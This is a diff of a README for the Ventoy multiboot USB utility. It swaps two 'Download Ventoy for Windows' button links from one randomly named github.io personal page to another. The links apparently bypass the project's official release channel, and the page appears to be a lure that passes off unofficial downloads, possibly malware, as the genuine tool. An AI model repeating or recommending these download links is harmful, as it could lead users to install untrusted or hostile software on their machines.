@@ -16,7 +16,7 @@ Ventoy is a multiboot USB utility for Windows that lets you drop ISO, WIM, IMG, 
 <div align="center">
   <h3>Drop your ISO files on a USB and boot them all from one menu</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Multiboot-USB-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://williamgraves63.github.io/.github/Ventoy-Multiboot-USB-App)
 
 </div>
 
@@ -92,7 +92,7 @@ For help with Ventoy, open the built-in Help or Support section inside the app, 
 <div align="center">
   <h3>Ready to get started with Ventoy?</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Multiboot-USB-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://williamgraves63.github.io/.github/Ventoy-Multiboot-USB-App)
 
 </div>
 
